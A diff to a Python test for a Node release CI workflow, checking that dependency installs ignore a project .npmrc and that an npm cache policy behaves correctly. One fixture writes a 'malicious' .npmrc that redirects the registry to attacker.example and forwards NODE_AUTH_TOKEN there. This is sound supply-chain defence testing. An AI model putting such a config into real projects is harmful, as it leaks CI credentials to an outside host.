@@ -26,6 +26,105 @@ def write_package(directory, manifest, recorder):
     (directory / "record-lifecycle.cjs").write_text(recorder)
 
 
+def run_workflow_step(script, env):
+    return subprocess.run(
+        ["bash", "-c", script], text=True, capture_output=True, env=env,
+    )
+
+
+def verify_project_npmrc_isolation(script):
+    with tempfile.TemporaryDirectory(prefix="node-release-npmrc-isolation-") as temp:
+        root = Path(temp)
+        runner_temp = root / "runner-temp"
+        runner_temp.mkdir()
+        wrapper_dir = root / "bin"
+        wrapper_dir.mkdir()
+        npm_trace = root / "npm-observation.log"
+        wrapper = wrapper_dir / "npm"
+        wrapper.write_text(
+            "#!/usr/bin/env bash\n"
+            "set -euo pipefail\n"
+            'if [[ -e "$GITHUB_WORKSPACE/.npmrc" || -L "$GITHUB_WORKSPACE/.npmrc" ]]; then config=present; else config=absent; fi\n'
+            'if [[ -n "${NODE_AUTH_TOKEN-}" ]]; then token=present; else token=absent; fi\n'
+            'printf "%s|%s|%s\\n" "$config" "$token" "$*" >>"$NPM_TRACE"\n'
+            'exit "${NPM_EXIT_CODE:-0}"\n'
+        )
+        wrapper.chmod(0o755)
+        project_npmrc = root / ".npmrc"
+        malicious_config = (
+            "registry=https://attacker.example/\n"
+            "//attacker.example/:_authToken=${NODE_AUTH_TOKEN}\n"
+        )
+        project_npmrc.write_text(malicious_config, encoding="utf-8")
+        env = os.environ.copy()
+        env.update({
+            "GITHUB_WORKSPACE": str(root),
+            "RUNNER_TEMP": str(runner_temp),
+            "GITHUB_OUTPUT": str(root / "github-output"),
+            "GITHUB_STEP_SUMMARY": str(root / "step-summary"),
+            "NODE_AUTH_TOKEN": "synthetic-package-token",
+            "NPM_TRACE": str(npm_trace),
+            "PATH": f"{wrapper_dir}{os.pathsep}{env['PATH']}",
+            "NPM_EXIT_CODE": "0",
+        })
+
+        result = run_workflow_step(script, env)
+        assert result.returncode == 0, result.stderr
+        assert npm_trace.read_text(encoding="utf-8").splitlines() == [
+            "absent|present|ci --ignore-scripts",
+        ]
+        assert project_npmrc.read_text(encoding="utf-8") == malicious_config
+        assert not list(runner_temp.glob("verjson-npmrc-isolation.*"))
+
+        npm_trace.unlink()
+        env["NPM_EXIT_CODE"] = "23"
+        result = run_workflow_step(script, env)
+        assert result.returncode == 23, result.stderr
+        assert npm_trace.read_text(encoding="utf-8").splitlines() == [
+            "absent|present|ci --ignore-scripts",
+        ]
+        assert project_npmrc.read_text(encoding="utf-8") == malicious_config
+        assert not list(runner_temp.glob("verjson-npmrc-isolation.*"))
+
+        npm_trace.unlink()
+        project_npmrc.unlink()
+        env["NPM_EXIT_CODE"] = "0"
+        result = run_workflow_step(script, env)
+        assert result.returncode == 0, result.stderr
+        assert npm_trace.read_text(encoding="utf-8").splitlines() == [
+            "absent|present|ci --ignore-scripts",
+        ]
+
+
+def verify_npm_cache_policy(script):
+    cases = (
+        ("true", "true", "true", "false", True),
+        ("true", "false", "true", "true", False),
+        ("false", "false", "true", "false", False),
+        ("true", "false", "false", "false", False),
+    )
+    for requested, private_token, lockfile, expected, report_disabled in cases:
+        with tempfile.TemporaryDirectory(prefix="node-release-cache-policy-") as temp:
+            root = Path(temp)
+            output = root / "output"
+            summary = root / "summary"
+            env = os.environ.copy()
+            env.update({
+                "CACHE_REQUESTED": requested,
+                "HAS_PRIVATE_PACKAGE_TOKEN": private_token,
+                "LOCKFILE_MATCHED": lockfile,
+                "GITHUB_OUTPUT": str(output),
+                "GITHUB_STEP_SUMMARY": str(summary),
+            })
+            result = run_workflow_step(script, env)
+            assert result.returncode == 0, result.stderr
+            assert output.read_text(encoding="utf-8").splitlines() == [
+                f"enabled={expected}",
+            ]
+            summary_text = summary.read_text(encoding="utf-8") if summary.exists() else ""
+            assert ("private package credentials were supplied" in summary_text) == report_disabled
+
+
 def main():
     repo_root = Path(__file__).resolve().parent.parent
     workflow = (repo_root / ".github/workflows/node-release.yml").read_text()
@@ -61,10 +160,24 @@ def main():
     )
     assert install_step, "node-release workflow is missing its dependency acquisition step"
     assert lifecycle_step, "node-release workflow is missing its tokenless lifecycle step"
-    assert "run: npm ci --ignore-scripts" in install_step["step"]
+    assert "npm ci --ignore-scripts" in install_step["step"]
     assert "NODE_AUTH_TOKEN: ${{ secrets.NODE_AUTH_TOKEN }}" in install_step["step"]
     assert "run: npm ci --prefer-offline" in lifecycle_step["step"]
     assert "NODE_AUTH_TOKEN" not in lifecycle_step["step"]
+    workflow_install_step = next(
+        step for step in prepare_job["steps"] if step.get("name") == "Install dependencies"
+    )
+    assert "npm ci --ignore-scripts" in workflow_install_step["run"]
+    verify_project_npmrc_isolation(workflow_install_step["run"])
+    cache_policy_step = next(
+        step for step in prepare_job["steps"] if step.get("id") == "npm-cache-policy"
+    )
+    assert cache_policy_step.get("env") == {
+        "CACHE_REQUESTED": "${{ inputs.cache }}",
+        "HAS_PRIVATE_PACKAGE_TOKEN": "${{ secrets.NODE_AUTH_TOKEN != '' }}",
+        "LOCKFILE_MATCHED": "${{ hashFiles(inputs.cache-dependency-path) != '' }}",
+    }
+    verify_npm_cache_policy(cache_policy_step["run"])
 
     lifecycle_recorder = (
         "const fs = require('node:fs');\n"
